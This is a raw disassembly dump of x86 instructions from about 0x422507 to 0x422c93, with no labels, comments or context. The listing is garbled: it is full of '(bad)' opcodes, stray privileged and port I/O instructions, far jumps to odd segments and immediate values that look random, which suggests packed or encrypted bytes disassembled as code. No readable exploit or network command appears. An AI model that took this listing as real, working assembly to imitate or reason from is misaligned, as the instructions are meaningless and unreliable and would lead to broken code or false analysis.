  422507:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422508:	scas   al,BYTE PTR es:[edi]
  422509:	(bad)
  42250c:	mov    dh,0xb
  42250e:	addr16 stc 
  422510:	push   edx
  422511:	stos   DWORD PTR es:[edi],eax
  422512:	ds mov ebx,0xbdabb13d
  422518:	mov    edx,0xaa7e1674
  42251d:	mov    esi,0x51ae332d
  422522:	add    al,0x19
  422524:	stc    
  422525:	add    DWORD PTR [ebx+edx*1],ebx
  422528:	push   esp
  422529:	sbb    bl,BYTE PTR [edi-0x7e]
  42252c:	les    ebp,FWORD PTR ds:0x60c4c81f
  422532:	(bad)  
  422533:	xchg   ebp,eax
  422534:	mov    WORD PTR [ecx-0x7a],?
  422537:	sbb    dl,ah
  422539:	pop    ebx
  42253a:	ss dec esi
  42253c:	sub    DWORD PTR [eax],edx
  42253e:	dec    ebx
  42253f:	dec    ebx
  422540:	popf   
  422541:	push   edx
  422542:	xlat   BYTE PTR ds:[ebx]
  422543:	xor    dh,BYTE PTR [ebp+0x5ff63770]
  422549:	mov    dh,0xb6
  42254b:	jnp    0x4225c6
  42254d:	std    
  42254e:	ds sahf 
  422550:	and    esp,DWORD PTR [ecx+0x3c]
  422553:	mov    bl,0x1e
  422555:	inc    esi
  422556:	sar    bh,1
  422558:	jns    0x422511
  42255a:	cli    
  42255b:	xchg   ebp,eax
  42255c:	leave  
  42255d:	(bad)  
  42255e:	lds    edx,FWORD PTR [edi+eiz*1+0x39187fac]
  422565:	cdq    
  422566:	add    eax,0xf309151c
  42256b:	mov    ch,0xce
  42256d:	sub    eax,0xd21975ab
  422572:	inc    edx
  422573:	lar    ebp,WORD PTR [eax+edi*2]
  422577:	push   esi
  422578:	mov    esi,0x76e458f7
  42257d:	arpl   WORD PTR [ebp+0x33],dx
  422580:	dec    edi
  422581:	mov    al,0x8c
  422583:	add    esp,DWORD PTR [edx]
  422585:	cli    
  422586:	dec    esi
  422587:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422588:	add    esi,0xffffffdc
  42258b:	stos   BYTE PTR es:[edi],al
  42258c:	shr    DWORD PTR [eax],0x8b
  42258f:	ins    BYTE PTR es:[edi],dx
  422590:	repz je 0x422527
  422593:	push   DWORD PTR [ebx+0x13cd01aa]
  422599:	aas    
  42259a:	and    DWORD PTR [esi+0x97843c9],esi
  4225a0:	adc    DWORD PTR [esi+0x48],0xffffffa1
  4225a4:	push   0xf6ee1b4b
  4225a9:	xor    al,0x57
  4225ab:	out    dx,eax
  4225ac:	mov    ebp,0x7fdfd228
  4225b1:	int3   
  4225b2:	mov    al,ds:0x65588c01
  4225b7:	cli    
  4225b8:	test   al,0xfe
  4225ba:	jne    0x42257c
  4225bc:	int    0x9e
  4225be:	jbe    0x422594
  4225c0:	scas   al,BYTE PTR es:[edi]
  4225c1:	ret    
  4225c2:	(bad)  
  4225c3:	pop    ecx
  4225c4:	dec    eax
  4225c5:	aaa    
  4225c6:	cli    
  4225c7:	xchg   esi,eax
  4225c8:	mov    ebx,0xb3296a38
  4225cd:	xchg   BYTE PTR [edx],cl
  4225cf:	pop    esp
  4225d0:	xchg   ebp,eax
  4225d1:	add    esi,ebp
  4225d3:	clc    
  4225d4:	push   ecx
  4225d5:	xchg   BYTE PTR ds:0x4483dd5d,dl
  4225db:	jns    0x4225c1
  4225dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225de:	xchg   esp,edx
  4225e0:	pop    es
  4225e1:	inc    eax
  4225e2:	xchg   ecx,eax
  4225e3:	shl    DWORD PTR [ebx-0x1c5b071f],cl
  4225e9:	dec    edi
  4225ea:	lahf   
  4225eb:	js     0x42257f
  4225ed:	neg    BYTE PTR [edi+0x23]
  4225f0:	inc    esi
  4225f1:	cmp    eax,0xd9df38bf
  4225f6:	lock mov bh,0x8f
  4225f9:	sub    eax,ebp
  4225fb:	cs adc eax,0x90a15e35
  422601:	out    0x40,al
  422603:	push   edi
  422604:	cmp    edx,DWORD PTR [eax+0x78]
  422607:	arpl   dx,si
  422609:	inc    esp
  42260a:	mov    bh,0xbc
  42260c:	mov    ebp,0xf82a70e6
  422611:	dec    ebp
  422612:	jns    0x4225ed
  422614:	(bad)  
  422615:	jg     0x42266e
  422617:	mov    bh,0x1f
  422619:	sub    bl,ch
  42261b:	popf   
  42261c:	or     BYTE PTR [esi+0x49],0xa9
  422620:	or     DWORD PTR [esi-0x12e1b65f],eax
  422626:	test   DWORD PTR [ebp+0x1e],ebx
  422629:	push   edi
  42262a:	aam    0x3d
  42262c:	bound  esp,QWORD PTR [ebx-0x48]
  42262f:	stos   BYTE PTR es:[edi],al
  422630:	pop    ebp
  422631:	in     eax,0xa1
  422633:	pop    es
  422634:	xor    al,0x59
  422636:	cld    
  422637:	mov    bl,0xb1
  422639:	jo     0x422603
  42263b:	loopne 0x4225ee
  42263d:	gs retf 0xcc86
  422641:	(bad)  
  422642:	jecxz  0x4225e9
  422644:	dec    ecx
  422645:	inc    ebx
  422646:	fsubr  QWORD PTR [edi-0x21]
  422649:	inc    ecx
  42264a:	dec    ebx
  42264b:	lods   al,BYTE PTR ds:[esi]
  42264c:	add    DWORD PTR [eax+0x48701899],eax
  422652:	push   esi
  422653:	out    dx,al
  422654:	inc    ebx
  422655:	arpl   WORD PTR [eax+0x6b],bx
  422658:	sahf   
  422659:	add    al,0x5f
  42265b:	mov    edx,0xd479f42
  422660:	scas   al,BYTE PTR es:[edi]
  422661:	lock cmc 
  422663:	dec    ebp
  422664:	sbb    esp,DWORD PTR [edi+0x72]
  422667:	retfw  
  422669:	(bad)  
  42266a:	shr    DWORD PTR [esi-0x66],1
  42266d:	add    cl,BYTE PTR [ebp+0x5c]
  422670:	into   
  422671:	loope  0x42268e
  422673:	xchg   edx,eax
  422674:	popa   
  422675:	je     0x4226bf
  422677:	mov    WORD PTR [edi],ss
  422679:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42267a:	jmp    0x42263c
  42267c:	ret    0xb0a4
  42267f:	ins    DWORD PTR es:[edi],dx
  422680:	sbb    ch,BYTE PTR [edi-0x6f9d99ba]
  422686:	dec    ebx
  422687:	ds adc eax,0x8e5a9420
  42268d:	add    eax,0xdeeb5c44
  422692:	add    BYTE PTR [ebp-0x3e],ch
  422695:	pop    ebp
  422696:	mov    DWORD PTR [ebp+esi*2-0x35fb1344],ebp
  42269d:	in     eax,dx
  42269e:	arpl   WORD PTR [ebx+0x542d6752],bx
  4226a4:	nop
  4226a5:	outs   dx,BYTE PTR ds:[esi]
  4226a6:	dec    ecx
  4226a7:	aas    
  4226a8:	mov    eax,ds:0xf7ded371
  4226ad:	mov    eax,ds:0xc665ab78
  4226b2:	clflush BYTE PTR [ebx+eax*1]
  4226b6:	fcomp  QWORD PTR [edx-0x48]
  4226b9:	xchg   DWORD PTR [eax-0x3886569],ebp
  4226bf:	sbb    eax,0xea1eee63
  4226c4:	nop
  4226c5:	(bad)  
  4226c6:	aad    0xfa
  4226c8:	push   edi
  4226c9:	enter  0x418a,0x0
  4226cd:	nop
  4226ce:	scas   al,BYTE PTR es:[edi]
  4226cf:	jge    0x42270c
  4226d1:	sbb    DWORD PTR [ecx+ebp*2+0x7100ca4d],edx
  4226d8:	shl    DWORD PTR [esi-0x6b2de488],cl
  4226de:	adc    edi,DWORD PTR [edx]
  4226e0:	and    al,0x54
  4226e2:	mov    ds:0xc7fe2c8c,al
  4226e7:	cwde   
  4226e8:	or     al,0x83
  4226ea:	jp     0x422760
  4226ec:	imul   esi,eax,0x6a
  4226ef:	lods   al,BYTE PTR ds:[esi]
  4226f0:	dec    ebx
  4226f1:	fadd   DWORD PTR [ebp+0x4d1072c1]
  4226f7:	push   0x1a
  4226f9:	mov    ebx,0xab16d90f
  4226fe:	jecxz  0x42274b
  422700:	and    DWORD PTR [edx+0x2d5edfc4],edx
  422706:	adc    DWORD PTR [edi],0xb
  422709:	hlt    
  42270a:	inc    ebx
  42270b:	push   ecx
  42270c:	sub    ebx,DWORD PTR [ecx-0x4be079e8]
  422712:	mov    edi,0x65865263
  422717:	sub    eax,0xb071dc92
  42271c:	pop    ds
  42271d:	inc    ebp
  42271e:	mov    bl,0x1
  422720:	int3   
  422721:	or     cl,bh
  422723:	xchg   DWORD PTR [edi+0x94a94e5],ebp
  422729:	mov    esp,0x7ce54c3a
  42272e:	lods   al,BYTE PTR ds:[esi]
  42272f:	scas   al,BYTE PTR es:[edi]
  422730:	mov    edx,0xa6f69af9
  422735:	mov    esi,0xbb605af3
  42273a:	or     eax,0xa0e0f2ad
  42273f:	js     0x42278a
  422741:	inc    esi
  422742:	aaa    
  422743:	xchg   edx,eax
  422744:	hlt    
  422745:	sar    ch,cl
  422747:	fidiv  DWORD PTR [ebx+0x32988560]
  42274d:	lods   al,BYTE PTR ds:[esi]
  42274e:	int    0x6b
  422750:	push   ebx
  422751:	je     0x422764
  422753:	ret    
  422754:	and    al,0x35
  422756:	jp     0x4227b2
  422758:	xor    eax,0x9634c4a8
  42275d:	(bad)  
  42275e:	ja     0x4227d9
  422760:	out    dx,al
  422761:	sbb    eax,0xabb2e43b
  422766:	xor    DWORD PTR [esi+0x410d1e12],eax
  42276c:	add    BYTE PTR [edi],0xb5
  42276f:	pop    eax
  422770:	or     edx,0x57
  422773:	inc    esi
  422774:	cmp    BYTE PTR [esi-0x17b6adb1],al
  42277a:	push   edi
  42277b:	(bad)  
  42277c:	cmp    DWORD PTR [ebp+0x6f],ebp
  42277f:	fucomi st,st(5)
  422781:	je     0x42271b
  422783:	shl    BYTE PTR [esi-0x42],1
  422786:	jl     0x422766
  422788:	xchg   ebx,eax
  422789:	ja     0x422744
  42278b:	dec    esi
  42278c:	dec    ecx
  42278d:	bsf    ebp,edi
  422790:	nop
  422791:	repz aad 0x1a
  422794:	pop    ds
  422795:	mov    edx,0x49e1001a
  42279a:	pop    ss
  42279b:	out    dx,eax
  42279c:	(bad)  
  42279d:	loope  0x4227e6
  42279f:	or     eax,0x60c00ee
  4227a4:	xchg   ebx,eax
  4227a5:	jnp    0x42280e
  4227a7:	mov    dl,0x62
  4227a9:	rcr    DWORD PTR [edi+ebx*2+0x7bd21b23],1
  4227b0:	dec    eax
  4227b1:	lahf   
  4227b2:	fs stc 
  4227b4:	mov    ecx,0x3420df0e
  4227b9:	xchg   ecx,eax
  4227ba:	pop    esi
  4227bb:	or     al,0x79
  4227bd:	sub    ah,0xdd
  4227c0:	or     DWORD PTR [eax+ebp*2-0x4],0x48f391f
  4227c8:	cmp    BYTE PTR [esi+ebp*2+0x36],cl
  4227cc:	push   0x6257d61c
  4227d1:	shl    BYTE PTR [edx+0x19],0xa1
  4227d5:	fwait
  4227d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227d7:	scas   al,BYTE PTR es:[edi]
  4227d8:	fcmovb st,st(7)
  4227da:	fsubp  st(6),st
  4227dc:	inc    esp
  4227dd:	pop    ds
  4227de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227df:	mov    dh,bl
  4227e1:	push   cs
  4227e2:	dec    edx
  4227e3:	xchg   BYTE PTR [edi-0x25482204],al
  4227e9:	in     al,0x1e
  4227eb:	sbb    edi,ecx
  4227ed:	and    dl,bl
  4227ef:	test   al,0x8d
  4227f1:	jmp    DWORD PTR [edi+ebx*8]
  4227f4:	neg    bh
  4227f6:	ins    BYTE PTR es:[edi],dx
  4227f7:	neg    BYTE PTR [edi+0x5d9b11d8]
  4227fd:	inc    esi
  4227fe:	push   0xfffffff2
  422800:	pop    eax
  422801:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422802:	imul   ebp,edx,0xe94e46b6
  422808:	sbb    DWORD PTR [ebp+0x1c],ecx
  42280b:	inc    ecx
  42280c:	pop    esi
  42280d:	mov    cl,0x1b
  42280f:	sub    ch,BYTE PTR [ebp-0x5d]
  422812:	add    bl,bl
  422814:	aad    0xe0
  422816:	div    BYTE PTR [esi]
  422818:	mov    eax,ds:0xb83a148b
  42281d:	pop    esp
  42281e:	dec    edi
  42281f:	sbb    dl,BYTE PTR ss:[ebx]
  422822:	or     DWORD PTR [edx+0x8],edi
  422825:	aam    0x41
  422827:	add    al,0x7c
  422829:	lahf   
  42282a:	in     eax,dx
  42282b:	push   ebp
  42282c:	dec    esp
  42282d:	mov    BYTE PTR [ebx],bl
  42282f:	xchg   ebp,eax
  422830:	push   ds
  422831:	pop    edi
  422832:	mov    edi,0x5ba9b1c7
  422837:	jge    0x4227fb
  422839:	jns    0x4227f1
  42283b:	mov    edi,DWORD PTR [esi]
  42283d:	pop    ds
  42283e:	jge    0x422802
  422840:	mov    ?,ebx
  422842:	dec    esp
  422843:	add    dh,BYTE PTR [eax+0x3c]
  422846:	es mov ebx,0xefed3344
  42284c:	aad    0x46
  42284e:	icebp  
  42284f:	aaa    
  422850:	leave  
  422851:	dec    eax
  422852:	push   ecx
  422853:	add    esp,ebp
  422855:	sar    DWORD PTR [ebp+0x6cd6ebef],1
  42285b:	icebp  
  42285c:	push   ecx
  42285d:	sub    ah,BYTE PTR [esi+edi*2+0x7]
  422861:	push   esp
  422862:	cmc    
  422863:	cli    
  422864:	mov    ds:0xfdc19a88,al
  422869:	scas   al,BYTE PTR es:[edi]
  42286a:	daa    
  42286b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42286c:	lock jae 0x42281d
  42286f:	jno    0x4228e0
  422871:	lods   al,BYTE PTR ds:[esi]
  422872:	stc    
  422873:	xchg   ecx,eax
  422874:	sbb    eax,0x946e6ce0
  422879:	add    eax,0x21c450ed
  42287e:	fcomp  QWORD PTR [ebp+0x39cd5b98]
  422884:	cmp    ebp,DWORD PTR [ebp+0x6dc09ce7]
  42288a:	mov    ebx,ebx
  42288c:	dec    edx
  42288d:	popa   
  42288e:	aam    0x63
  422890:	dec    edx
  422891:	mov    esp,0xbff525d4
  422896:	xor    eax,edx
  422898:	or     edx,DWORD PTR [edx]
  42289a:	(bad)  
  42289b:	mov    cl,0x8b
  42289d:	js     0x4228a1
  42289f:	or     ebp,DWORD PTR [ecx+ebx*1+0x44692fe2]
  4228a6:	adc    BYTE PTR [edx-0x6f44723],bh
  4228ac:	mov    eax,0x8b89edc4
  4228b1:	bswap  ebp
  4228b3:	in     al,dx
  4228b4:	daa    
  4228b5:	dec    esi
  4228b6:	std    
  4228b7:	xor    DWORD PTR [edi],ebx
  4228b9:	in     al,0x9e
  4228bb:	push   cs
  4228bc:	push   edi
  4228bd:	outs   dx,BYTE PTR ds:[esi]
  4228be:	es xchg edx,eax
  4228c0:	xchg   BYTE PTR ds:0x669d5730,dl
  4228c6:	xchg   ecx,eax
  4228c7:	inc    ecx
  4228c8:	or     esp,DWORD PTR [edx-0x5f]
  4228cb:	aam    0x7b
  4228cd:	push   ebx
  4228ce:	xchg   ecx,eax
  4228cf:	jg     0x422855
  4228d1:	ret    0x14bf
  4228d4:	les    ebx,FWORD PTR [ecx]
  4228d6:	sbb    al,0xbc
  4228d8:	adc    dh,BYTE PTR [ecx-0x56]
  4228db:	inc    edi
  4228dc:	das    
  4228dd:	cli    
  4228de:	int    0x55
  4228e0:	ins    DWORD PTR es:[edi],dx
  4228e1:	push   ebx
  4228e2:	pop    ss
  4228e3:	jo     0x4228aa
  4228e5:	sahf   
  4228e6:	push   eax
  4228e7:	mov    bh,0xa8
  4228e9:	jge    0x42291a
  4228eb:	mov    esp,0xe20e3347
  4228f0:	sbb    esp,DWORD PTR [esi-0x54773985]
  4228f6:	stc    
  4228f7:	jmp    0xd49d:0x9cf07be3
  4228fe:	adc    esi,DWORD PTR ds:0x68d54a0e
  422904:	push   0x4e
  422906:	dec    edx
  422907:	pop    edx
  422908:	and    DWORD PTR [ebx],esp
  42290a:	xchg   edx,eax
  42290b:	or     al,0x85
  42290d:	je     0x422967
  42290f:	scas   al,BYTE PTR es:[edi]
  422910:	(bad)  
  422911:	pop    esp
  422912:	stc    
  422913:	aas    
  422914:	adc    al,0x2f
  422916:	call   0x23eb:0x6d47b064
  42291d:	addr16 ret 
  42291f:	xchg   edx,eax
  422920:	or     al,0xcc
  422922:	aaa    
  422923:	sahf   
  422924:	jne    0x422997
  422926:	and    BYTE PTR [ecx-0x6715d66a],ch
  42292c:	pop    edx
  42292d:	cmp    al,0x9e
  42292f:	scas   eax,DWORD PTR es:[edi]
  422930:	xchg   ebx,eax
  422931:	lods   al,BYTE PTR ds:[esi]
  422932:	add    BYTE PTR [ebx],0x5f
  422935:	pop    es
  422936:	jecxz  0x42290a
  422938:	cmp    BYTE PTR [eax+0x61dc929c],0x37
  42293f:	mov    bh,0x7
  422941:	inc    ecx
  422942:	leave  
  422943:	cmc    
  422944:	dec    eax
  422945:	dec    edx
  422946:	mov    esi,0xe3bfc052
  42294b:	cmp    dl,ch
  42294d:	aas    
  42294e:	mov    eax,DWORD PTR [esi+0x12]
  422951:	jl     0x4228d8
  422953:	jnp    0x422956
  422955:	inc    esp
  422956:	xchg   edx,eax
  422957:	imul   edx,DWORD PTR [ebx],0xffffffe0
  42295a:	mov    dl,0x75
  42295c:	jbe    0x42296a
  42295e:	mov    ebx,0x7d234aad
  422963:	mov    eax,0x6a2f7db5
  422968:	test   DWORD PTR [ebp-0x1da27298],edi
  42296e:	pop    ds
  42296f:	sbb    al,0x3f
  422971:	in     al,dx
  422972:	sbb    edx,edx
  422974:	mov    gs,WORD PTR [ebp-0x3bad0596]
  42297a:	das    
  42297b:	out    dx,eax
  42297c:	retf   
  42297d:	loopne 0x4229f5
  42297f:	in     al,0x4b
  422981:	rcr    BYTE PTR [edx],cl
  422983:	adc    ax,WORD PTR [edx]
  422986:	push   ebx
  422987:	call   0x701ff2e0
  42298c:	in     eax,0x2b
  42298e:	inc    esi
  42298f:	jne    0x422966
  422991:	enter  0xe8f4,0xbc
  422995:	sbb    BYTE PTR [eax],0xf
  422998:	mov    DWORD PTR [eax],esi
  42299a:	fdivrp st(1),st
  42299c:	push   ebx
  42299d:	and    ebp,esp
  42299f:	jg     0x42292c
  4229a1:	mov    dh,ch
  4229a3:	test   BYTE PTR [ebp-0xfa04c32],ch
  4229a9:	shr    BYTE PTR [ebx+edx*1-0x45],1
  4229ad:	(bad)  
  4229ae:	xchg   ebp,eax
  4229af:	(bad)  
  4229b0:	and    DWORD PTR [edx],0x23e01f2e
  4229b6:	sbb    DWORD PTR [eax],edi
  4229b8:	inc    edi
  4229b9:	jle    0x422a26
  4229bb:	or     BYTE PTR ds:0x8742398,al
  4229c1:	popf   
  4229c2:	jl     0x422a35
  4229c4:	rcl    BYTE PTR [ecx+0x3a0a4963],1
  4229ca:	or     BYTE PTR [edx+0x1881a6a5],0x34
  4229d1:	lock fisubr DWORD PTR [ecx+0x36]
  4229d5:	xchg   edx,eax
  4229d6:	inc    esi
  4229d7:	pop    esp
  4229d8:	push   eax
  4229d9:	scas   al,BYTE PTR es:[edi]
  4229da:	xchg   ebx,eax
  4229db:	addr16 in al,0x58
  4229de:	inc    ecx
  4229df:	popa   
  4229e0:	push   eax
  4229e1:	xor    DWORD PTR [esi-0x32190c45],ecx
  4229e7:	scas   al,BYTE PTR es:[edi]
  4229e8:	pusha  
  4229e9:	sub    dl,al
  4229eb:	cmp    edi,0xc1e1fb04
  4229f1:	jge    0x422a5b
  4229f3:	or     esi,DWORD PTR [edi-0x64]
  4229f6:	fs cld 
  4229f8:	xor    dh,BYTE PTR [ecx+0x70b381a9]
  4229fe:	mov    esi,0xc2968d05
  422a03:	cmp    ch,al
  422a05:	loope  0x422a3d
  422a07:	sbb    bl,BYTE PTR [eax+0x52]
  422a0a:	test   DWORD PTR [edx],ebp
  422a0c:	(bad)  
  422a0d:	fidiv  DWORD PTR [esi-0x708946fe]
  422a13:	push   esi
  422a14:	mov    bl,0x98
  422a16:	jne    0x42299b
  422a18:	sti    
  422a19:	xchg   ecx,eax
  422a1a:	sbb    al,0x28
  422a1c:	and    eax,DWORD PTR [ebx]
  422a1e:	sbb    edi,ebx
  422a20:	lods   al,BYTE PTR ds:[esi]
  422a21:	rol    BYTE PTR ds:0x45f39572,0x9c
  422a28:	imul   ebx,DWORD PTR [ebp+0x5ad9d48],0x5d
  422a2f:	sub    DWORD PTR [ebp+eax*1+0x2dfc1d2a],ebp
  422a36:	out    dx,eax
  422a37:	jmp    DWORD PTR [edx]
  422a39:	test   ecx,edi
  422a3b:	popw   ss
  422a3d:	pop    ss
  422a3e:	scas   al,BYTE PTR es:[edi]
  422a3f:	mov    ah,0x71
  422a41:	in     al,dx
  422a42:	and    al,0x74
  422a44:	leave  
  422a45:	xor    DWORD PTR [ecx],eax
  422a47:	aad    0xd4
  422a49:	(bad)  [esi]
  422a4b:	jecxz  0x422a34
  422a4d:	lods   eax,DWORD PTR ds:[esi]
  422a4e:	sar    DWORD PTR [edx+0x4f],cl
  422a51:	mov    esi,0x5f7c9b4
  422a56:	stos   BYTE PTR es:[edi],al
  422a57:	jae    0x422a94
  422a59:	push   edx
  422a5a:	add    BYTE PTR ds:0x2097e1bf,cl
  422a60:	xor    eax,DWORD PTR [esi-0x77f52f80]
  422a66:	inc    edx
  422a67:	stc    
  422a68:	dec    edx
  422a69:	daa    
  422a6a:	test   eax,0x216bc146
  422a6f:	mov    eax,ds:0x8ff139f4
  422a74:	add    dl,BYTE PTR [ebp+0x4c]
  422a77:	mov    ebp,0x17815d00
  422a7c:	imul   ebx,DWORD PTR [ebp+0x39],0x41
  422a80:	stos   BYTE PTR es:[edi],al
  422a81:	iret   
  422a82:	jle    0x422a13
  422a84:	mov    eax,ds:0x5de0b973
  422a89:	mov    bh,0x27
  422a8b:	and    eax,0x5b6357f3
  422a90:	jo     0x422a1f
  422a92:	leave  
  422a93:	xchg   ecx,eax
  422a94:	stos   DWORD PTR es:[edi],eax
  422a95:	jecxz  0x422a28
  422a97:	mov    eax,0x4c8d9422
  422a9c:	and    bl,BYTE PTR [ecx+0x1e]
  422a9f:	mov    BYTE PTR [ebx-0x2b15881b],cl
  422aa5:	push   0x41
  422aa7:	add    al,0x4
  422aa9:	cmp    eax,0x510d6c16
  422aae:	out    dx,eax
  422aaf:	popw   es
  422ab1:	xchg   DWORD PTR [ebx-0x3e39294b],ebp
  422ab7:	in     eax,0x27
  422ab9:	jmp    0x2018:0x1cec5c7
  422ac0:	lods   eax,DWORD PTR ds:[esi]
  422ac1:	sub    eax,0x8a403164
  422ac6:	ret    
  422ac7:	js     0x422aef
  422ac9:	imul   eax,DWORD PTR [esi-0x3a89a1d6],0x68db8747
  422ad3:	out    dx,al
  422ad4:	outs   dx,BYTE PTR ds:[esi]
  422ad5:	and    al,0x4b
  422ad7:	xor    ecx,esp
  422ad9:	mov    esp,0xeb9f4b01
  422ade:	ret    0x97b1
  422ae1:	mov    edi,0x13cddcd
  422ae6:	dec    ebp
  422ae7:	pop    es
  422ae8:	fwait
  422ae9:	push   ebx
  422aea:	mov    ds:0x40af98b5,eax
  422aef:	xchg   DWORD PTR [esi-0x42a7a10f],esi
  422af5:	sbb    BYTE PTR [eax],dl
  422af7:	stc    
  422af8:	test   al,0xde
  422afa:	lea    ebp,[edi]
  422afc:	aam    0x2c
  422afe:	adc    eax,0xf468aa91
  422b03:	adc    eax,0x3767d5bd
  422b08:	ds aad 0x3d
  422b0b:	std    
  422b0c:	xchg   edi,eax
  422b0d:	xchg   esp,eax
  422b0e:	sub    ch,ah
  422b10:	ss dec ebx
  422b12:	push   ss
  422b13:	jg     0x422ac6
  422b15:	daa    
  422b16:	popa   
  422b17:	fimul  DWORD PTR [edi+ecx*8]
  422b1a:	into   
  422b1b:	inc    esp
  422b1c:	(bad)  
  422b1d:	fidiv  DWORD PTR [eax-0x2a]
  422b20:	pop    esp
  422b21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b22:	aam    0x96
  422b24:	ja     0x422b71
  422b26:	icebp  
  422b27:	jl     0x422aae
  422b29:	int3   
  422b2a:	ss xor al,0xe6
  422b2d:	mov    ebp,0x73f4b7ff
  422b32:	sub    al,0xd6
  422b34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b35:	push   ecx
  422b36:	xchg   BYTE PTR [eax],bl
  422b38:	sar    DWORD PTR [ebx-0x37],0x10
  422b3c:	or     BYTE PTR [ecx+0x33],dl
  422b3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b40:	mov    al,0xc1
  422b42:	jne    0x422ad9
  422b44:	jmp    0x422b0c
  422b46:	and    eax,0xd351931d
  422b4b:	imul   ebp,DWORD PTR [edx+0x18],0x37
  422b4f:	xchg   eax,ebp
  422b51:	retf   0x45f0
  422b54:	fwait
  422b55:	mov    edi,0xce6276e4
  422b5a:	pop    es
  422b5b:	inc    edx
  422b5c:	repz icebp 
  422b5e:	inc    esi
  422b5f:	(bad)  
  422b60:	mov    al,0xa3
  422b62:	xor    ch,ch
  422b64:	movntps XMMWORD PTR [edi-0xd87bcea],xmm5
  422b6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b6c:	pop    ebp
  422b6d:	es jnp 0x422b12
  422b70:	mov    DWORD PTR [ecx-0x17],edi
  422b73:	clc    
  422b74:	fisttp WORD PTR [ecx-0x29f2c815]
  422b7a:	fld    TBYTE PTR ds:0x24d7a7a5
  422b80:	xor    bh,BYTE PTR [esp+ebp*2]
  422b83:	jnp    0x422b81
  422b85:	cmp    eax,0x6ebc2da
  422b8a:	or     eax,0x44d2f907
  422b8f:	call   0x9001:0x1d6a706c
  422b96:	push   ds
  422b97:	mov    ebx,0x9a514980
  422b9c:	jmp    0x422b35
  422b9e:	fidiv  WORD PTR [ebx+0x563067b6]
  422ba4:	or     al,0x5f
  422ba6:	stos   BYTE PTR es:[edi],al
  422ba7:	and    edx,edi
  422ba9:	retf   0xf672
  422bac:	std    
  422bad:	ins    DWORD PTR es:[edi],dx
  422bae:	ins    DWORD PTR es:[edi],dx
  422baf:	ins    BYTE PTR es:[edi],dx
  422bb0:	cmp    al,0xb1
  422bb2:	mov    DWORD PTR [ebx],esi
  422bb4:	mov    bl,0x1
  422bb6:	and    bh,BYTE PTR [edi]
  422bb8:	lods   eax,DWORD PTR ds:[esi]
  422bb9:	inc    edi
  422bba:	fcom   st(6)
  422bbc:	scas   eax,DWORD PTR es:[edi]
  422bbd:	add    esi,DWORD PTR [edx]
  422bbf:	sbb    ch,BYTE PTR [edi+ebp*8-0x31]
  422bc3:	jge    0x422b5d
  422bc5:	pusha  
  422bc6:	fild   DWORD PTR [edi]
  422bc8:	ins    BYTE PTR es:[edi],dx
  422bc9:	inc    edx
  422bca:	and    esp,DWORD PTR [ecx-0x64]
  422bcd:	iret   
  422bce:	outs   dx,BYTE PTR ds:[esi]
  422bcf:	sti    
  422bd0:	add    eax,0xeb67379e
  422bd5:	pop    edx
  422bd6:	pop    es
  422bd7:	dec    edi
  422bd8:	mov    dh,0x77
  422bda:	scas   al,BYTE PTR es:[edi]
  422bdb:	nop
  422bdc:	pop    esp
  422bdd:	mov    al,ds:0x81ee1c8
  422be2:	enter  0xaa79,0x17
  422be6:	mov    ecx,0x513a078c
  422beb:	xchg   DWORD PTR [eax-0x2af3df1e],esp
  422bf1:	mov    bl,0x3e
  422bf3:	nop
  422bf4:	lods   eax,DWORD PTR ds:[esi]
  422bf5:	pop    esi
  422bf6:	inc    DWORD PTR [edi]
  422bf8:	icebp  
  422bf9:	js     0x422b8d
  422bfb:	pusha  
  422bfc:	adc    eax,0xc1aacdd3
  422c01:	mov    eax,ds:0xdb6dd840
  422c06:	jnp    0x422be0
  422c08:	mov    ch,0x81
  422c0a:	lds    edi,FWORD PTR [ecx]
  422c0c:	call   0x1f7a0ff9
  422c11:	push   ebp
  422c12:	xchg   edi,eax
  422c13:	call   0xc4c2:0xb3de4171
  422c1a:	sti    
  422c1b:	push   0xffffffd1
  422c1d:	popf   
  422c1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c1f:	jae    0x422bef
  422c21:	jmp    0x422c9a
  422c23:	jmp    0x422ca2
  422c25:	retf   
  422c26:	dec    ebp
  422c27:	lods   al,BYTE PTR ds:[esi]
  422c28:	push   esi
  422c29:	sub    eax,0xce12a12c
  422c2e:	mov    dh,0xeb
  422c30:	test   al,0x86
  422c32:	sar    dh,cl
  422c34:	push   cs
  422c35:	adc    bl,BYTE PTR cs:[ebx+eax*8]
  422c39:	adc    BYTE PTR [esi-0x45b3ec7d],0x18
  422c40:	stos   BYTE PTR es:[edi],al
  422c41:	mov    ds:0x42887fda,al
  422c46:	xor    BYTE PTR [eax+ebp*4+0x41aa7ac5],cl
  422c4d:	cwde   
  422c4e:	mov    WORD PTR [edi-0x2e0ff098],fs
  422c54:	retw   0x6aa5
  422c58:	add    cl,ah
  422c5a:	pop    ss
  422c5b:	add    BYTE PTR [eax-0x63ed141e],al
  422c61:	ret    0x7ae8
  422c64:	xor    eax,edi
  422c66:	jecxz  0x422c7e
  422c68:	enter  0x5be8,0x8d
  422c6c:	mov    dh,0x3c
  422c6e:	pushf  
  422c6f:	jecxz  0x422c8c
  422c71:	cmp    esp,DWORD PTR [ebp+ecx*2-0x5bb34cde]
  422c78:	and    bh,dh
  422c7a:	out    0xcd,al
  422c7c:	fwait
  422c7d:	fwait
  422c7e:	sti    
  422c7f:	or     edx,DWORD PTR [ebp+0x7b]
  422c82:	inc    esp
  422c83:	xchg   esi,eax
  422c84:	sub    DWORD PTR [ebx],edi
  422c86:	jno    0x422ce4
  422c88:	inc    eax
  422c89:	ds loop 0x422c35
  422c8c:	int    0x9b
  422c8e:	dec    ebp
  422c8f:	push   eax
  422c90:	add    BYTE PTR [edx+0x58],ah
  422c93:	push   edi
